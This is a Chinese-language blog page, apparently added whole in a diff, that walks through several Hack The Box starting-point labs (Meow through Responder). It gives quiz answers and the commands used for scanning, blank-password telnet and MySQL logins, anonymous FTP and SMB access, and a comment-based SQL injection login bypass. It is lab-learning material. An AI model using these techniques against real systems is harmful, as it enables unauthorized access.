@@ -1,0 +1,2296 @@
+<!DOCTYPE HTML>
+<html lang="zh-CN">
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="keywords" content="Hackthebox, marin的小窝">
+    <meta name="description" content="Hacktheboxvpn 连接，在这里要选择 tcp 我的 wsl 才能连接，不知道为什么
+
+虚拟机需要权限才能连接
+
+‍
+Meow
+What does the acronym VM stand for?
+VM 这个缩写代表什么？
+
+vi">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="renderer" content="webkit|ie-stand|ie-comp">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="format-detection" content="telephone=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="referrer" content="no-referrer-when-downgrade">
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+
+
+    <title>Hackthebox | marin的小窝</title>
+    <link rel="icon" type="image/jpeg" href="/favicon.jpg">
+    
+
+
+    <!-- bg-cover style     -->
+
+
+
+<link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.min.css">
+<link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
+<link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
+<link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
+<link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
+<link rel="stylesheet" type="text/css" href="/css/matery.css">
+<link rel="stylesheet" type="text/css" href="/css/my.css">
+<link rel="stylesheet" type="text/css" href="/css/dark.css" media="none" onload="if(media!='all')media='all'">
+
+
+
+
+    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
+    <link rel="stylesheet" href="/css/post.css">
+
+
+
+
+    
+        <link rel="stylesheet" type="text/css" href="/css/reward.css">
+    
+
+
+
+    <script src="/libs/jquery/jquery-3.6.0.min.js"></script>
+
+<meta name="generator" content="Hexo 8.1.1"></head>
+
+
+<body>
+    <header class="navbar-fixed">
+    <nav id="headNav" class="bg-color nav-transparent">
+        <div id="navContainer" class="nav-wrapper container">
+            <div class="brand-logo">
+                <a href="/" class="waves-effect waves-light">
+                    
+                    <img src="/medias/logo.png" class="logo-img" alt="LOGO">
+                    
+                    <span class="logo-span">marin的小窝</span>
+                </a>
+            </div>
+            
+
+<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
+<ul class="right nav-menu">
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/" class="waves-effect waves-light">
+      
+      <i class="fas fa-home" style="zoom: 0.6;"></i>
+      
+      <span>主页</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/tags" class="waves-effect waves-light">
+      
+      <i class="fas fa-tags" style="zoom: 0.6;"></i>
+      
+      <span>标签</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/categories" class="waves-effect waves-light">
+      
+      <i class="fas fa-bookmark" style="zoom: 0.6;"></i>
+      
+      <span>类型</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/archives" class="waves-effect waves-light">
+      
+      <i class="fas fa-archive" style="zoom: 0.6;"></i>
+      
+      <span>归档</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/about" class="waves-effect waves-light">
+      
+      <i class="fas fa-user-circle" style="zoom: 0.6;"></i>
+      
+      <span>关于我</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/friends" class="waves-effect waves-light">
+      
+      <i class="fas fa-address-book" style="zoom: 0.6;"></i>
+      
+      <span>友链</span>
+    </a>
+    
+  </li>
+  
+  <li>
+    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
+      <i id="searchIcon" class="fas fa-search" title="搜索" style="zoom: 0.85;"></i>
+    </a>
+  </li>
+  <li>
+    <a href="javascript:;" class="waves-effect waves-light" onclick="switchNightMode()" title="深色/浅色模式" >
+      <i id="sum-moon-icon" class="fas fa-sun" style="zoom: 0.85;"></i>
+    </a>
+  </li>
+</ul>
+
+
+<div id="mobile-nav" class="side-nav sidenav">
+
+    <div class="mobile-head bg-color">
+        
+        <img src="/medias/logo.png" class="logo-img circle responsive-img">
+        
+        <div class="logo-name">marin的小窝</div>
+        <div class="logo-desc">
+            
+            一个学习网安的小菜鸡
+            
+        </div>
+    </div>
+
+    <ul class="menu-list mobile-menu-list">
+        
+        <li class="m-nav-item">
+	  
+		<a href="/" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-home"></i>
+			
+			主页
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/tags" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-tags"></i>
+			
+			标签
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/categories" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-bookmark"></i>
+			
+			类型
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/archives" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-archive"></i>
+			
+			归档
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/about" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-user-circle"></i>
+			
+			关于我
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/friends" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-address-book"></i>
+			
+			友链
+		</a>
+          
+        </li>
+        
+        
+    </ul>
+</div>
+
+
+        </div>
+
+        
+    </nav>
+
+</header>
+
+    
+
+
+
+<div class="bg-cover pd-header post-cover" style="background-image: url('https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/fdd81ab4e06b3b576916484ce1da2b81.jpg')">
+    <div class="container" style="right: 0px;left: 0px;">
+        <div class="row">
+            <div class="col s12 m12 l12">
+                <div class="brand">
+                    <h1 class="description center-align post-title">Hackthebox</h1>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+<main class="post-container content">
+
+    
+    <div class="row">
+    <div id="main-content" class="col s12 m12 l9">
+        <!-- 文章内容详情 -->
+<div id="artDetail">
+    <div class="card">
+        <div class="card-content article-info">
+            <div class="row tag-cate">
+                <div class="col s7">
+                    
+                    <div class="article-tag">
+                        
+                            <a href="/tags/web/">
+                                <span class="chip bg-color">web</span>
+                            </a>
+                        
+                            <a href="/tags/%E5%88%B7%E9%A2%98/">
+                                <span class="chip bg-color">刷题</span>
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+                <div class="col s5 right-align">
+                    
+                    <div class="post-cate">
+                        <i class="fas fa-bookmark fa-fw icon-category"></i>
+                        
+                            <a href="/categories/WEB/" class="post-category">
+                                WEB
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+            </div>
+
+            <div class="post-info">
+                
+                <div class="post-date info-break-policy">
+                    <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
+                    2025-08-27
+                </div>
+                
+
+                
+
+                
+
+                
+
+                
+            </div>
+        </div>
+        <hr class="clearfix">
+
+        
+        <!-- 是否加载使用自带的 prismjs. -->
+        <link rel="stylesheet" href="/libs/prism/prism.css">
+        
+
+        
+
+        <div class="card-content article-card-content">
+            <div id="articleContent">
+                <h1 id="Hackthebox"><a href="#Hackthebox" class="headerlink" title="Hackthebox"></a>Hackthebox</h1><p>vpn 连接，在这里要选择 tcp 我的 wsl 才能连接，不知道为什么</p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260204001840-l5km2cv.png" alt="image"></p>
+<p>虚拟机需要权限才能连接</p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260204001843-4wc7m5k.png" alt="image"></p>
+<p>‍</p>
+<h2 id="Meow"><a href="#Meow" class="headerlink" title="Meow"></a>Meow</h2><blockquote>
+<p>What does the acronym VM stand for?</p>
+<p>VM 这个缩写代表什么？</p>
+</blockquote>
+<p><code>virtual machine</code></p>
+<p>‍</p>
+<blockquote>
+<p>What tool do we use to interact with the operating system in order to issue commands via the command line, such as the one to start our VPN connection? It’s also known as a console or shell.</p>
+<p>我们使用什么工具与操作系统交互，以便通过命令行发出命令，例如启动 VPN 连接的命令？它也被称为控制台或 shell。</p>
+</blockquote>
+<p><code>terminal</code></p>
+<p>‍</p>
+<blockquote>
+<p>What service do we use to form our VPN connection into HTB labs?</p>
+<p>我们使用什么服务来建立与HTB实验室的VPN连接？</p>
+</blockquote>
+<p><code>openvpn</code></p>
+<p>‍</p>
+<blockquote>
+<p>What tool do we use to test our connection to the target with an ICMP echo request?</p>
+<p>我们使用什么工具来测试与目标设备的 ICMP 回显请求连接？</p>
+</blockquote>
+<p><code>ping</code></p>
+<p>‍</p>
+<blockquote>
+<p>What is the name of the most common tool for finding open ports on a target?</p>
+<p>查找目标系统上开放端口最常用的工具叫什么名字？</p>
+</blockquote>
+<p><code>nmap</code></p>
+<p>‍</p>
+<blockquote>
+<p>What service do we identify on port 23&#x2F;tcp during our scans?</p>
+<p>我们在扫描过程中在 23&#x2F;tcp 端口上识别出什么服务？</p>
+</blockquote>
+<p><code>telnet</code></p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260204001845-h0cv7xp.png" alt="image"></p>
+<p>‍</p>
+<blockquote>
+<p>What username is able to log into the target over telnet with a blank password?</p>
+<p>哪个用户名可以使用空密码通过 telnet 登录到目标主机？</p>
+</blockquote>
+<p><code>root</code></p>
+<p>这里是根据提示猜出来的</p>
+<p>‍</p>
+<blockquote>
+<p>Submit root flag</p>
+</blockquote>
+<p>这里先登录进来</p>
+<pre class="line-numbers language-bash" data-language="bash" data-start="1"><code class="language-bash">telnet -l root 10.129.253.211 23</code></pre>
+
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260204001847-gapx40l.png" alt="image"></p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260204001849-rbghgqa.png" alt="image"></p>
+<p>‍</p>
+<h2 id="fawn"><a href="#fawn" class="headerlink" title="fawn"></a>fawn</h2><blockquote>
+<p>What does the 3-letter acronym FTP stand for?</p>
+<p>FTP 这三个字母的缩写代表什么？</p>
+</blockquote>
+<p><code>File Transfer Protocol</code></p>
+<p>‍</p>
+<blockquote>
+<p>Which port does the FTP service listen on usually?</p>
+<p>FTP 服务通常监听哪个端口？</p>
+</blockquote>
+<p><code>21</code></p>
+<p>‍</p>
+<blockquote>
+<p>FTP sends data in the clear, without any encryption. What acronym is used for a later protocol designed to provide similar functionality to FTP but securely, as an extension of the SSH protocol?</p>
+<p>FTP 以明文形式发送数据，不进行任何加密。后来出现了一种协议，旨在提供与 FTP 类似的功能，但更加安全，它是 SSH 协议的扩展，该协议的缩写是什么？</p>
+</blockquote>
+<p><code>SFTP</code></p>
+<p>‍</p>
+<blockquote>
+<p>What is the command we can use to send an ICMP echo request to test our connection to the target?</p>
+<p>我们可以使用什么命令发送 ICMP 回显请求来测试与目标的连接？</p>
+</blockquote>
+<p><code>ping</code></p>
+<p>‍</p>
+<blockquote>
+<p>From your scans, what version is FTP running on the target?</p>
+<p>根据扫描结果，目标主机上运行的是哪个版本的 FTP？</p>
+</blockquote>
+<p>这里利用的是 nmap 的参数 <code>-sV</code>，这个参数会向开放的端口发送探测报文，然后解析响应，确定服务以获取精确版本号</p>
+<pre class="line-numbers language-bash" data-language="bash" data-start="1"><code class="language-bash">nmap -sV 10.129.55.44</code></pre>
+
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260204001851-zfiqcyj.png" alt="image"></p>
+<p><code>vsftpd 3.0.3</code></p>
+<p>‍</p>
+<blockquote>
+<p>From your scans, what OS type is running on the target?</p>
+<p>根据扫描结果，目标设备运行的是哪种操作系统？</p>
+</blockquote>
+<p>这里利用的参数是 <code>-A</code> 可以同时进行操作系统和版本探测</p>
+<pre class="line-numbers language-bash" data-language="bash" data-start="1"><code class="language-bash">nmap -A 10.129.55.44</code></pre>
+
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260204001853-6tben39.png" alt="image"></p>
+<p><code>Unix</code></p>
+<p>‍</p>
+<blockquote>
+<p>What is the command we need to run in order to display the ‘ftp’ client help menu?</p>
+<p>要显示 ftp 客户端的帮助菜单，我们需要运行什么命令？</p>
+</blockquote>
+<p><code>ftp -?</code></p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260204001854-e9i59pd.png" alt="image"></p>
+<p>‍</p>
+<blockquote>
+<p>What is username that is used over FTP when you want to log in without having an account?</p>
+<p>当您想在没有帐户的情况下通过 FTP 登录时，使用的用户名是什么？</p>
+</blockquote>
+<p><code>anonymous</code></p>
+<p>‍</p>
+<blockquote>
+<p>What is the response code we get for the FTP message ‘Login successful’?</p>
+<p>对于“登录成功”的 FTP 消息，我们得到的响应代码是什么？</p>
+</blockquote>
+<p>使用匿名用户登录的参数是 <code>-a</code></p>
+<pre class="line-numbers language-bash" data-language="bash" data-start="1"><code class="language-bash">ftp -a 10.129.55.44 21</code></pre>
+
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260204001856-ah7chy2.png" alt="image"></p>
+<p><code>230</code></p>
+<p>‍</p>
+<blockquote>
+<p>There are a couple of commands we can use to list the files and directories available on the FTP server. One is dir. What is the other that is a common way to list files on a Linux system.</p>
+<p>我们可以使用几个命令来列出 FTP 服务器上可用的文件和目录。一个是 dir 命令。另一个是 Linux 系统上常用的文件列表命令是什么？</p>
+</blockquote>
+<p><code>ls</code></p>
+<p>‍</p>
+<blockquote>
+<p>What is the command used to download the file we found on the FTP server?</p>
+<p>用来下载我们在 FTP 服务器上找到的文件的命令是什么？</p>
+</blockquote>
+<p><code>get</code></p>
+<p>‍</p>
+<blockquote>
+<p>Submit root flag</p>
+</blockquote>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260204001858-1171azj.png" alt="image"></p>
+<p>‍</p>
+<h2 id="Dancing"><a href="#Dancing" class="headerlink" title="Dancing"></a>Dancing</h2><blockquote>
+<p>What does the 3-letter acronym SMB stand for?</p>
+<p>SMB 这三个字母的缩写代表什么？</p>
+</blockquote>
+<p><code>Server Message Block</code></p>
+<p>‍</p>
+<blockquote>
+<p>What port does SMB use to operate at?</p>
+<p>SMB 协议使用哪个端口运行？</p>
+</blockquote>
+<p><code>445</code></p>
+<p>‍</p>
+<blockquote>
+<p>What is the service name for port 445 that came up in our Nmap scan?</p>
+<p>我们在 Nmap 扫描中发现的 445 端口的服务名称是什么？</p>
+</blockquote>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260204001902-qfcud4k.png" alt="image"></p>
+<p><code>microsoft-ds</code></p>
+<p>‍</p>
+<blockquote>
+<p>What is the ‘flag’ or ‘switch’ that we can use with the smbclient utility to ‘list’ the available shares on Dancing?</p>
+<p>我们可以使用 smbclient 工具的哪个“标志”或“开关”来“列出”Dancing 上的可用共享？</p>
+</blockquote>
+<p><code>-L</code></p>
+<p>‍</p>
+<blockquote>
+<p>How many shares are there on Dancing?</p>
+<p>在 Dancing 上有多少个共享</p>
+</blockquote>
+<pre class="line-numbers language-bash" data-language="bash" data-start="1"><code class="language-bash">smbclient -L 10.129.180.218</code></pre>
+
+<ul>
+<li><code>-L</code>：尝试列出目标主机上所有可用的共享</li>
+</ul>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260204001904-kv527cj.png" alt="image"></p>
+<p><code>4</code></p>
+<p>‍</p>
+<blockquote>
+<p>What is the name of the share we are able to access in the end with a blank password?</p>
+<p>我们不用密码就能访问哪个共享文件夹？</p>
+</blockquote>
+<p>因为只有这个共享是用户创建的，其他都是默认管理共享</p>
+<p><code>WorkShares</code></p>
+<p>‍</p>
+<blockquote>
+<p>What is the command we can use within the SMB shell to download the files we find?</p>
+<p>在 SMB shell 中，我们可以使用什么命令来下载找到的文件？</p>
+</blockquote>
+<p><code>get</code></p>
+<p>‍</p>
+<blockquote>
+<p>Submit root flag</p>
+</blockquote>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260204001907-k4ae7dx.png" alt="image"></p>
+<p>‍</p>
+<h2 id="Redeemer"><a href="#Redeemer" class="headerlink" title="Redeemer"></a>Redeemer</h2><blockquote>
+<p>Which TCP port is open on the machine?</p>
+<p>机器上哪个 TCP 端口是开放的？</p>
+</blockquote>
+<pre class="line-numbers language-bash" data-language="bash" data-start="1"><code class="language-bash">nmap -p- -T4 10.129.181.213</code></pre>
+
+<ul>
+<li><code>-p-</code>：全端口扫描，扫了好久</li>
+<li><code>-T4</code>：加速</li>
+<li><code>-p &lt;端口号范围&gt;</code>：可以用这个指定扫描的端口号范围</li>
+</ul>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260204001909-29f4uek.png" alt="image"></p>
+<p><code>6379</code></p>
+<p>‍</p>
+<blockquote>
+<p>Which service is running on the port that is open on the machine?</p>
+<p>机器上打开的端口正在运行哪个服务？</p>
+</blockquote>
+<p><code>redis</code></p>
+<p>‍</p>
+<blockquote>
+<p>What type of database is Redis? Choose from the following options: (i) In-memory Database, (ii) Traditional Database</p>
+<p>Redis 是什么类型的数据库？请从以下选项中选择：（i）内存数据库，（ii）传统数据库</p>
+</blockquote>
+<p><code>In-memory Database</code></p>
+<p>‍</p>
+<blockquote>
+<p>Which command-line utility is used to interact with the Redis server? Enter the program name you would enter into the terminal without any arguments.</p>
+<p>哪个命令行工具用于与 Redis 服务器交互？请输入您在终端中输入的程序名称（不带任何参数）</p>
+</blockquote>
+<p><code>redis-cli</code></p>
+<p>‍</p>
+<blockquote>
+<p>Which flag is used with the Redis command-line utility to specify the hostname?</p>
+<p>在 Redis 命令行工具中，使用哪个标志来指定主机名？</p>
+</blockquote>
+<p><code>-h</code></p>
+<p>‍</p>
+<blockquote>
+<p>Once connected to a Redis server, which command is used to obtain the information and statistics about the Redis server?</p>
+<p>连接到 Redis 服务器后，使用哪个命令可以获取有关 Redis 服务器的信息和统计信息？</p>
+</blockquote>
+<p><code>info</code></p>
+<p>‍</p>
+<blockquote>
+<p>What is the version of the Redis server being used on the target machine?</p>
+<p>目标机器上使用的 Redis 服务器版本是什么？</p>
+</blockquote>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260204001911-540q5sc.png" alt="image"></p>
+<p>‍</p>
+<blockquote>
+<p>Which command is used to select the desired database in Redis?</p>
+<p>在 Redis 中，使用哪个命令来选择所需的数据库？</p>
+</blockquote>
+<p><code>select</code></p>
+<p>‍</p>
+<blockquote>
+<p>How many keys are present inside the database with index 0?</p>
+<p>数据库中索引为 0 的键有多少个？</p>
+</blockquote>
+<p>这两个都能确定数量就是 4</p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260204001913-x632ads.png" alt="image"></p>
+<p>‍</p>
+<blockquote>
+<p>Which command is used to obtain all the keys in a database?</p>
+<p>哪个命令可以用来获取数据库中的所有键？</p>
+</blockquote>
+<p><code>keys *</code></p>
+<p>‍</p>
+<blockquote>
+<p>Submit root flag</p>
+</blockquote>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260204001915-mp7zblv.png" alt="image"></p>
+<p>‍</p>
+<h2 id="Appointment"><a href="#Appointment" class="headerlink" title="Appointment"></a>Appointment</h2><blockquote>
+<p>What does the acronym SQL stand for?</p>
+<p>SQL 是什么的缩写？</p>
+</blockquote>
+<p><code>Structured Query Language</code></p>
+<p>‍</p>
+<blockquote>
+<p>What is one of the most common type of SQL vulnerabilities?</p>
+<p>最常见的 SQL 漏洞类型之一是什么？</p>
+</blockquote>
+<p><code>sql injection</code></p>
+<p>‍</p>
+<blockquote>
+<p>What is the 2021 OWASP Top 10 classification for this vulnerability?</p>
+<p>该漏洞在 2021 年 OWASP Top 10 中的分类是什么？</p>
+</blockquote>
+<p><code>A03:2021-Injection</code></p>
+<p>‍</p>
+<blockquote>
+<p>What does Nmap report as the service and version that are running on port 80 of the target?</p>
+<p>Nmap 报告称，目标主机 80 端口上运行的服务和版本是什么？</p>
+</blockquote>
+<p><code>Apache httpd 2.4.38 ((Debian))</code></p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260204001917-ulzhf1v.png" alt="image"></p>
+<p>‍</p>
+<blockquote>
+<p>What is the standard port used for the HTTPS protocol?</p>
+<p>HTTPS 协议的标准端口是什么？</p>
+</blockquote>
+<p><code>443</code></p>
+<p>‍</p>
+<blockquote>
+<p>What is a folder called in web-application terminology?</p>
+<p>在 Web 应用程序术语中，文件夹叫什么？</p>
+</blockquote>
+<p><code>Directory</code></p>
+<p>‍</p>
+<blockquote>
+<p>What is the HTTP response code is given for ‘Not Found’ errors?</p>
+<p>对于“未找到”错误，HTTP 响应代码是什么？</p>
+</blockquote>
+<p><code>404</code></p>
+<p>‍</p>
+<blockquote>
+<p>Gobuster is one tool used to brute force directories on a webserver. What switch do we use with Gobuster to specify we’re looking to discover directories, and not subdomains?</p>
+<p>Gobuster 是一款用于暴力破解 Web 服务器目录的工具。在使用 Gobuster 时，我们应该使用哪个参数来指定我们要查找的是目录而不是子域名？</p>
+</blockquote>
+<p><code>dir</code></p>
+<p>‍</p>
+<blockquote>
+<p>What single character can be used to comment out the rest of a line in MySQL?</p>
+<p>在 MySQL 中，可以使用哪个单个字符来注释掉一行剩余的内容？</p>
+</blockquote>
+<p><code>#</code></p>
+<p>‍</p>
+<blockquote>
+<p>If user input is not handled carefully, it could be interpreted as a comment. Use a comment to login as admin without knowing the password. What is the first word on the webpage returned?</p>
+<p>如果用户输入处理不当，它可能被解释为注释。请使用注释在不知道密码的情况下以 admin 身份登录。返回的网页上的第一个单词是什么？</p>
+</blockquote>
+<p>这里可以 curl 到这个网页，用浏览器打开，这里我的本机不知道为什么连不上这个 vpn，只能用 wsl 做</p>
+<pre class="line-numbers language-bash" data-language="bash" data-start="1"><code class="language-bash">firefox http:&#x2F;&#x2F;10.129.224.158:80</code></pre>
+
+<p>最简单的 sql 注入</p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260204001920-fiywoyb.png" alt="image"></p>
+<p><code>Congratulations</code></p>
+<p>‍</p>
+<p>‍</p>
+<p>‍</p>
+<h2 id="Sequel"><a href="#Sequel" class="headerlink" title="Sequel"></a>Sequel</h2><blockquote>
+<p>During our scan, which port do we find serving MySQL?</p>
+<p>扫描过程中，我们发现哪个端口在运行 MySQL？</p>
+</blockquote>
+<p><code>3306</code></p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260204001922-1iunx0i.png" alt="image"></p>
+<p>‍</p>
+<blockquote>
+<p>What community-developed MySQL version is the target running?</p>
+<p>目标系统运行的是哪个社区开发的 MySQL 版本？</p>
+</blockquote>
+<p>‍</p>
+<pre class="line-numbers language-bash" data-language="bash" data-start="1"><code class="language-bash">nmap -sC 10.129.95.232</code></pre>
+
+<ul>
+<li><code>-sC</code>：使用默认脚本来扫描，可能能识别更多信息</li>
+</ul>
+<p><code>MariaDB</code></p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260204001924-nimhg7s.png" alt="image"></p>
+<p>‍</p>
+<blockquote>
+<p>When using the MySQL command line client, what switch do we need to use in order to specify a login username?</p>
+<p>使用 MySQL 命令行客户端时，我们需要使用哪个开关来指定登录用户名？</p>
+</blockquote>
+<p><code>-u</code></p>
+<p>‍</p>
+<blockquote>
+<p>Which username allows us to log into this MariaDB instance without providing a password?</p>
+<p>哪个用户名允许我们在不提供密码的情况下登录此 MariaDB 实例？</p>
+</blockquote>
+<p><code>root</code></p>
+<p>‍</p>
+<blockquote>
+<p>In SQL, what symbol can we use to specify within the query that we want to display everything inside a table?</p>
+<p>在 SQL 中，我们可以使用哪个符号在查询中指定要显示表中的所有内容？</p>
+</blockquote>
+<p><code>*</code></p>
+<p>‍</p>
+<blockquote>
+<p>In SQL, what symbol do we need to end each query with?</p>
+<p>在 SQL 中，每个查询语句的结尾需要使用什么符号？</p>
+</blockquote>
+<p><code>;</code></p>
+<p>‍</p>
+<blockquote>
+<p>There are three databases in this MySQL instance that are common across all MySQL instances. What is the name of the fourth that’s unique to this host?</p>
+<p>此 MySQL 实例中有三个数据库是所有 MySQL 实例共有的。第四个数据库是此主机独有的，它的名称是什么？</p>
+</blockquote>
+<pre class="line-numbers language-bash" data-language="bash" data-start="1"><code class="language-bash">mysql -h 10.129.95.232 -P 3306 -u root</code></pre>
+
+<p>这里连接上很明显就是 htb（</p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260204001926-s8a1p0p.png" alt="image"></p>
+<p>‍</p>
+<blockquote>
+<p>Submit root flag</p>
+</blockquote>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260204001928-yoajcs3.png" alt="image"></p>
+<p>‍</p>
+<p>‍</p>
+<h2 id="Crocodile"><a href="#Crocodile" class="headerlink" title="Crocodile"></a>Crocodile</h2><blockquote>
+<p>What Nmap scanning switch employs the use of default scripts during a scan?</p>
+<p>Nmap 扫描过程中，哪个扫描开关会使用默认脚本？</p>
+</blockquote>
+<p><code>-sC</code></p>
+<p>‍</p>
+<blockquote>
+<p>What service version is found to be running on port 21?</p>
+<p>在端口 21 上运行的服务版本是什么？</p>
+</blockquote>
+<p><code>vsFTPd 3.0.3</code></p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260204001930-vc45p7q.png" alt="image"></p>
+<p>‍</p>
+<blockquote>
+<p>What FTP code is returned to us for the “Anonymous FTP login allowed” message?</p>
+<p>对于“允许匿名 FTP 登录”消息，返回给我们的 FTP 代码是什么？</p>
+</blockquote>
+<p>匿名登录成功就有这个代码</p>
+<p><code>230</code></p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260204001932-px5tmc4.png" alt="image"></p>
+<p>‍</p>
+<blockquote>
+<p>After connecting to the FTP server using the ftp client, what username do we provide when prompted to log in anonymously?</p>
+<p>使用 FTP 客户端连接到 FTP 服务器后，当提示匿名登录时，我们应该提供什么用户名？</p>
+</blockquote>
+<p><code>anonymous</code></p>
+<p>‍</p>
+<blockquote>
+<p>After connecting to the FTP server anonymously, what command can we use to download the files we find on the FTP server?</p>
+<p>匿名连接到 FTP 服务器后，我们可以使用什么命令下载在 FTP 服务器上找到的文件？</p>
+</blockquote>
+<p><code>get</code></p>
+<p>‍</p>
+<blockquote>
+<p>What is one of the higher-privilege sounding usernames in ‘allowed.userlist’ that we download from the FTP server?</p>
+<p>从 FTP 服务器下载的“allowed.userlist”文件中，有哪些用户名听起来权限较高？</p>
+</blockquote>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260204001934-8gmw63w.png" alt="image"></p>
+<p>‍</p>
+<blockquote>
+<p>What version of Apache HTTP Server is running on the target host?</p>
+<p>目标主机上运行的是哪个版本的 Apache HTTP 服务器？</p>
+</blockquote>
+<p><code>Apache httpd 2.4.41</code></p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260204001936-i2kn5d6.png" alt="image"></p>
+<p>‍</p>
+<blockquote>
+<p>What switch can we use with Gobuster to specify we are looking for specific filetypes?</p>
+<p>我们可以使用 Gobuster 的哪个开关来指定我们要查找的特定文件类型？</p>
+</blockquote>
+<p><code>-x</code></p>
+<p>‍</p>
+<blockquote>
+<p>Which PHP file can we identify with directory brute force that will provide the opportunity to authenticate to the web service?</p>
+<p>我们可以通过目录暴力破解找到哪个 PHP 文件，从而获得对 Web 服务的身份验证机会？</p>
+</blockquote>
+<p>直接 dirsearch 开扫</p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260204001937-rkoslx2.png" alt="image"></p>
+<p>‍</p>
+<blockquote>
+<p>Submit root flag</p>
+</blockquote>
+<p>直接拿前面得到用户密码登录就能拿到 flag</p>
+<p>‍</p>
+<h2 id="Responder"><a href="#Responder" class="headerlink" title="Responder"></a>Responder</h2><blockquote>
+<p>When visiting the web service using the IP address, what is the domain that we are being redirected to?</p>
+<p>使用 IP 地址访问网络服务时，我们会被重定向到哪个域名？</p>
+</blockquote>
+<p><code>unika.htb</code></p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260204001940-npk8gl8.png" alt="image"></p>
+<p>‍</p>
+<blockquote>
+<p>Which scripting language is being used on the server to generate webpages?</p>
+<p>服务器端使用哪种脚本语言来生成网页？</p>
+</blockquote>
+<p>这里遇到一个神秘的问题，我的 wsl 访问不到这个网址（</p>
+<p>问 ai 要在 host 中修改，在这里添加一个 <code>10.129.31.83    unika.htb</code> 才能访问</p>
+<pre class="line-numbers language-bash" data-language="bash" data-start="1"><code class="language-bash">sudo nano &#x2F;etc&#x2F;hosts</code></pre>
+
+<p><code>php</code></p>
+<p>‍</p>
+<blockquote>
+<p>What is the name of the URL parameter which is used to load different language versions of the webpage?</p>
+<p>用于加载网页不同语言版本的 URL 参数名称是什么？</p>
+</blockquote>
